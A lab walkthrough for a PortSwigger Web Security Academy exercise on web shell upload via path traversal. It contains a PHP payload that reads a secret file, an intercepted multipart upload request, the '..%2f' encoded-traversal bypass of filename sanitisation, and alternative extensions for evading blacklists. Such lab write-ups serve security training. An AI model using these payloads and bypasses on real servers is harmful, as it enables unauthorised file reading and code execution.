# [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

> uploading a malicious php file as an avatar and exploit it with path traversal

- boot up burp suite
- log in
- upload an image (any small image)
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image for avatar
- this request will be the exploit request -> send it to repeater

> exploit php file

- create a file called `exploit.php`

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- upload the file
- go back to the user page
- check the `/files/avatars/exploit.php`
- it returns the `php` as a plain text (the server does not executes it)

> re-upload test

- find the `/my-account/avatar` post request with the `exploit.php`
- send it to the repeater
- will see something like this

```
POST /my-account/avatar HTTP/2
...
------WebKitFormBoundaryQOWABE2f7EqbEHw3
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryQOWABE2f7EqbEHw3
...
```

- check the `Content-Disposition: form-data; name="avatar"; filename="exploit.php"` line
- modify the `filename="exploit.php"` to `filename="../exploit.php"`
- send it again
- in the response the position of the `exploit.php` did not change

```
...
The file avatars/exploit.php has been uploaded.
...
```

- since the `filename="../exploit.php"` it should be represented teh same way in the response like

```
...
The file avatars/../exploit.php has been uploaded.
...
```

- the server probably strips the `../` traversal
- lets try it with `..%2f`
- in the request modify the `filename="../exploit.php"` to `filename="..%2fexploit.php"`
- send it again
- the response should have it like `avatars/../exploit.php`
- try the `/files/avatars/../exploit.php`

> some servers might blacklist potentially dangerous file extensions like `.php`, but it's difficult to explicitly block every possible file extension that could be used to execute code, sometimes can be bypassed by using lesser known, alternative file extensions that may still be executable

- `.php5`
- `.shtml`
- ...
